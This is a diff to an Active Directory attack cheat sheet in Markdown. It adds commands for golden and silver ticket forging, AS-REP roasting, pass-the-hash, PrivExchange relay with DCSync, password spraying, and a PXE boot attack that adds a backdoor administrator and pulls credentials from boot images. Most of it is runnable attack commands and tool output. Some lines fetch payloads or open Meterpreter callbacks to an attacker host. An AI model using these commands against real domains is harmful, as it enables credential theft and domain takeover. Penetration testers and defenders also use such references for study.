@@ -9,8 +9,8 @@
   * [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
   * [Dumping AD Domain Credentials](#dumping-ad-domain-credentials-systemrootntdsntdsdit)
   * [Password in AD User comment](#password-in-ad-user-comment)
-  * [Golden Tickets](#passtheticket-golden-tickets)
-  * [Silver Tickets](#passtheticket-silver-tickets)
+  * [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
+  * [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
   * [Kerberoast](#kerberoast)
   * [KRB_AS_REP roasting](#krb_as_rep-roasting)
   * [Pass-the-Hash](#pass-the-hash)
@@ -23,6 +23,7 @@
   * [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
   * [PrivExchange attack](#privexchange-attack)
   * [Password spraying](#password-spraying)
+  * [PXE Boot image attack](#pxe-boot-image-attack)
 
 ## Tools
 
@@ -54,6 +55,7 @@
   crackmapexec smb -M name_module -o VAR=DATA
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --local-auth
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
+  crackmapexec 192.168.1.100 -u Jaddmon -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
   crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
@@ -90,6 +92,10 @@
 
     ```powershell
     pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
+    pingcastle.exe --healthcheck --server domain.local
+    pingcastle.exe --graph --server domain.local
+    pingcastle.exe --scanner scanner_name --server domain.local
+    available scanners are:aclcheck,antivirus,corruptADDatabase,foreignusers,laps_bitlocker,localadmin,ullsession,nullsession-trust,share,smb,spooler,startup
     ```
 
 * [Kerbrute](https://github.com/ropnop/kerbrute)
@@ -165,12 +171,12 @@ mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
 :warning: If the clock is skewed use `clock-skew.nse` script from `nmap`
 
 ```powershell
-$ nmap -sV -sC 10.10.10.10
+Linux> $ nmap -sV -sC 10.10.10.10
 clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s
 
-$ sudo date -s "14 APR 2015 18:25:16" 
+Linux> sudo date -s "14 APR 2015 18:25:16" 
+Windows> net time /domain /set
 ```
-
 
 ### Open Shares
 
@@ -225,6 +231,7 @@ Mount a share
 
 ```powershell
 smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
+sudo mount -t cifs -o username=<user>,password=<pass> //<IP>/Users folder
 ```
 
 ### GPO - Pivoting with Local Admin & Passwords in SYSVOL
@@ -368,6 +375,7 @@ CrackMapExec module
 
 ```powershell
 cme smb 10.10.0.202 -u username -p password --ntds vss
+cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
 ```
 
 ### Password in AD User comment
@@ -385,31 +393,33 @@ or dump the Active Directory and `grep` the content.
 ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
 ```
 
-### PassTheTicket Golden Tickets
+### Pass-the-Ticket Golden Tickets
 
-Forging a TGT require the krbtgt key
+Forging a TGT require the krbtgt NTLM hash
 
-Mimikatz version
+> The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.
+
+#### Using Mimikatz
 
 ```powershell
-Get info - Mimikatz
+# Get info - Mimikatz
 lsadump::dcsync /user:krbtgt
 lsadump::lsa /inject /name:krbtgt
 
-Forge a Golden ticket - Mimikatz
+# Forge a Golden ticket - Mimikatz
 kerberos::purge
 kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
 kerberos::tgt
 ```
 
-Meterpreter version
+#### Using Meterpreter 
 
 ```powershell
-Get info - Meterpreter(kiwi)
+# Get info - Meterpreter(kiwi)
 dcsync_ntlm krbtgt
 dcsync krbtgt
 
-Forge a Golden ticket - Meterpreter
+# Forge a Golden ticket - Meterpreter
 load kiwi
 golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
 golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
@@ -418,40 +428,51 @@ kerberos_ticket_use /root/Downloads/pentestlabuser.tck
 kerberos_ticket_list
 ```
 
-Using a ticket on Linux
+#### Using a ticket on Linux
 
 ```powershell
-Convert the ticket kirbi to ccache with kekeo
+# Convert the ticket kirbi to ccache with kekeo
 misc::convert ccache ticket.kirbi
 
-Alternatively you can use ticketer from Impacket
+# Alternatively you can use ticketer from Impacket
 ./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da
 
 ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
 ./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519
 
-
 export KRB5CCNAME=/home/user/ticket.ccache
 cat $KRB5CCNAME
 
-
-NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
+# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
 ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
-### PassTheTicket Silver Tickets
+If you need to swap ticket between Windows and Linux, you need to convert them with `ticket_converter` or `kekeo`.
+
+```powershell
+root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi
+Converting ccache => kirbi
+root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
+Converting kirbi => ccache
+```
+
+### Pass-the-Ticket Silver Tickets
 
 Forging a TGS require machine accound password (key) from the KDC
 
 ```powershell
-Create a ticket for the service
-kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE
-/kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
+# Create a ticket for the service
+mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE
 
-Then use the same steps as a Golden ticket
-misc::convert ccache ticket.kirbi
-export KRB5CCNAME=/home/user/ticket.ccache
-./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+# Examples
+mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
+mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park
+
+# Then use the same steps as a Golden ticket
+mimikatz $ misc::convert ccache ticket.kirbi
+
+root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
+root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
 ### Kerberoast
@@ -475,7 +496,7 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43c360c29c1
 Alternatively with [Rubeus](https://github.com/GhostPack/Rubeus)
 
 ```powershell
-.\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD
+.\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
 ```
 
 Then crack the ticket with hashcat or john
@@ -491,7 +512,7 @@ If a domain user does not have Kerberos preauthentication enabled, an AS-REP can
 
 ```powershell
 C:\>git clone https://github.com/GhostPack/Rubeus#asreproast
-C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user
+C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
 
  ______        _
 (_____ \      | |
@@ -519,11 +540,24 @@ v1.3.4
 [*] AS-REP hash:
 
     $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
+
+C:\Rubeus> john --wordlist=passwords_kerb.txt hashes.asreproast
+```
+
+Using `impacket` to get the hash and `hashcat` to crack it.
+
+```powershell
+# extract hashes
+root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+
+# crack AS_REP messages
+root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
 ```
 
 ### Pass-the-Hash
 
-The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes.
+The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.
 
 ```powershell
 use exploit/windows/smb/psexec
@@ -535,34 +569,50 @@ set SMBPass nastyCutt3r
 set PAYLOAD windows/meterpreter/bind_tcp
 run
 shell
+```
 
 or with crackmapexec
+
+```powershell
 cme smb 10.2.0.2 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
 also works with net range : cme smb 10.2.0.2/24 ... 
+```
 
 or with psexec
+
+```powershell
 proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
+```
 
 or with the builtin Windows RDP and mimikatz
+```powershell
 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
 ```
 
 ### OverPass-the-Hash (pass the key)
 
-Request a TGT with only the NT hash
+Request a TGT with only the NT hash then you can connect to the machine using the TGT.
+
+#### Using impacket
 
 ```powershell
-Using impacket
-./getTGT.py -hashes :1a59bd44fe5bec39c44c8cd3524dee lab.ropnop.com
-chmod 600 tgwynn.ccache
+root@kali:impacket-examples$ python ./getTGT.py -hashes :1a59bd44fe5bec39c44c8cd3524dee lab.ropnop.com
+root@kali:impacket-examples$ export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
+root@kali:impacket-examples$ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 
 also with the AES Key if you have it
-./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
-
+root@kali:impacket-examples$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
 
 ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
 kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
 klist
+```
+
+#### Using Rubeus
+
+```powershell
+C:\Users\triceratops>.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
+C:\Users\triceratops>.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
 
 ### Capturing and cracking NTLMv2 hashes
@@ -590,6 +640,8 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
 
 ### Dangerous Built-in Groups Usage
 
+If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System, " or set "adminCount" attribute to 0 for the required objec
+
 AdminSDHolder
 
 ```powershell
@@ -616,6 +668,8 @@ domainA.local      domainB.local                  TreeRoot       Bidirectional
 ```
 
 ### Unconstrained delegation
+
+> The user sends a TGS to access the service, along with their TGT, and then the service can use the user’s TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
 
 #### Find delegation
 
@@ -666,6 +720,10 @@ Extract the base64 TGT from Rubeus output and load it to our current session.
 Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HACKER\krbtgt`
 
 ### Resource-Based Constrained Delegation
+
+Resource-based Constrained Delegation was introduced in Windows Server 2012. 
+
+> The user sends a TGS to access the service ("Service A"), and if the service is allowed to delegate to another pre-defined service ("Service B"), then Service A can present to the authentication service the TGS that the user provided and obtain a TGS for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
 
 1. Import **Powermad** and **Powerview**
 
@@ -741,22 +799,46 @@ Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HAC
 
 ### PrivExchange attack
 
-Exchange your privileges for Domain Admin privs by abusing Exchange.
-You need a shell on a user account with a mailbox.
+Exchange your privileges for Domain Admin privs by abusing Exchange.    
+:warning: You need a shell on a user account with a mailbox.
 
-1. Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server.
+
+1. Exchange server hostname or IP address
+
+    ```bash 
+    pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username
+    ```
+
+
+2. Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).
+
+    ```powershell
+    ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
+    ```
+
+
+3. Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine.
+
     ```bash
     # https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py
     python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
+    python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange
     
     # https://github.com/G0ldenGunSec/PowerPriv 
     powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
     ```
 
-2. Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).
-3. Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash
+4. Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash
+
     ```bash
     python secretsdump.py xxxxxxxxxx -just-dc
+    python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
+    ```
+
+5. Clean your mess and restore a previous state of the user's ACL
+
+    ```powershell
+    python aclpwn.py --restore ../aclpwn-20190319-125741.restore
     ```
 
 Alternatively you can use the Metasploit module 
@@ -769,26 +851,29 @@ Password spraying refers to the attack method that takes a large number of usern
 
 > The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
 
-Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+#### Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+
+> Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).
 
 ```powershell
 root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 ```
 
-Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+#### Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
 
 ```powershell
 crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
 ```
 
-Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
+#### Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
 
 ```powershell
 python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
 ```
 
-Using [hydra]() and [ncrack]() to target RDP services.
+#### Using [hydra]() and [ncrack]() to target RDP services.
 
 ```powershell
 hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
@@ -802,49 +887,105 @@ Most of the time the best passwords to spray are :
 - $Companyname1
 
 
+### PXE Boot image attack
+
+PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.
+
+- Press **[F8]** during the PXE boot to spawn an administrator console on the deployed machine.
+- Press **[SHIFT+F10]** during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.
+
+    ```powershell
+    net user hacker Password123! /add
+    net localgroup administrators /add hacker
+    ```
+
+- Extract the pre-boot image (wim files) using [PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)](https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts.
+
+    ```powershell
+    # Import the module
+    PS > Import-Module .\PowerPXE.ps1
+
+    # Start the exploit on the Ethernet interface
+    PS > Get-PXEcreds -InterfaceAlias Ethernet
+    PS > Get-PXECreds -InterfaceAlias « lab 0 » 
+
+    # Wait for the DHCP to get an address
+    >> Get a valid IP adress
+    >>> >>> DHCP proposal IP address: 192.168.22.101
+    >>> >>> DHCP Validation: DHCPACK
+    >>> >>> IP address configured: 192.168.22.101
+
+    # Extract BCD path from the DHCP response
+    >> Request BCD File path
+    >>> >>> BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
+    >>> >>> TFTP IP Address:  192.168.22.3
+
+    # Download the BCD file and extract wim files
+    >> Launch TFTP download
+    >>>> Transfer succeeded.
+    >> Parse the BCD file: conf.bcd
+    >>>> Identify wim file : \Boot\x86\Images\LiteTouchPE_x86.wim
+    >>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
+    >> Launch TFTP download
+    >>>> Transfer succeeded.
+
+    # Parse wim files to find interesting data
+    >> Open LiteTouchPE_x86.wim
+    >>>> Finding Bootstrap.ini
+    >>>> >>>> DeployRoot = \\LAB-MDT\DeploymentShare$
+    >>>> >>>> UserID = MdtService
+    >>>> >>>> UserPassword = Somepass1
+    ```
+
+
 ## References
 
+* [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
+* [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
+* [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
+* [Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling](https://blog.netspi.com/attacks-against-windows-pxe-boot-images/)
 * [BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 & @5ub34x](https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/)
 * [Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh](https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html)
-* [Roasting AS-REPs - January 17, 2017 - harmj0y](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
-* [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
-* [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
-* [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
+* [BlueHat IL - Benjamin Delpy](https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf)
+* [COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger ](https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE)
+* [Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss](https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf)
+* [DiskShadow The return of VSS Evasion Persistence and AD DB extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
+* [Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin](https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/)
 * [Dumping Domain Password Hashes - Pentestlab](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
+* [Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace](https://zachgrace.com/posts/exploiting-ms14-068/)
+* [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)
+* [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
+* [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
+* [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
 * [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
 * [Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
-* [Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin](https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/)
+* [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
+* [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
+* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
+* [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
+* [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)
+* [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
 * [Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)](https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/)
 * [Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView](https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/)
 * [Pen Testing Active Directory Environments - Part III:  Chasing Power Users](https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/)
 * [Pen Testing Active Directory Environments - Part IV: Graph Fun](https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/)
 * [Pen Testing Active Directory Environments - Part V: Admins and Graphs](https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/)
 * [Pen Testing Active Directory Environments - Part VI: The Final Case](https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/)
-* [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
-* [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
-* [DiskShadow The return of VSS Evasion Persistence and AD DB extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
-* [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
+* [Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/)
+* [Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
+* [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
+* [Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
+* [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
+* [Roasting AS-REPs - January 17, 2017 - harmj0y](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
+* [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
+* [Using bloodhound to map the user network - Hausec](https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/)
+* [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)
 * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 1](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/)
 * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 2](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/)
 * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 3](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/)
 * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 4](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/)
 * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)
-* [BlueHat IL - Benjamin Delpy](https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf)
-* [Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
-* [Using bloodhound to map the user network - Hausec](https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/)
-* [Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/)
-* [Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
-* [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
-* [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
-* [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)
-* [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
-* [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
-* [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
-* [Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss](https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf)
-* [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
-* [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)
-* [Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace](https://zachgrace.com/posts/exploiting-ms14-068/)
-* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
